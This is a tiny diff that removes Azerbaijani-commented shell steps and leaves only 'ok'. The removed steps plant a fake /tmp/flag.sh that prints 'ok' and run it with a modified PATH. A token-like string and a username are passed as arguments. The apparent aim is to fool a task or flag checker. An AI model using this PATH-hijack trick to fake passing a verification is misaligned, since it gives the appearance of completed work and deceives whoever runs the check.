@@ -1,8 +1,1 @@
-# 1. Öz qovluğunuzda saxta flag.sh yaradın
-echo -e '#!/bin/bash\necho "ok"' > /tmp/flag.sh
-
-# 2. Faylı icra oluna bilən edin
-chmod +x /tmp/flag.sh
-
-# 3. İndi əmri PATH-i dəyişərək işə salın ki, sistem əvvəl /tmp-yə baxsın
-PATH=/tmp:$PATH ./flag.sh 18FDGSD485DFNDP elvinmammadzada 0-flag.txt
+ok
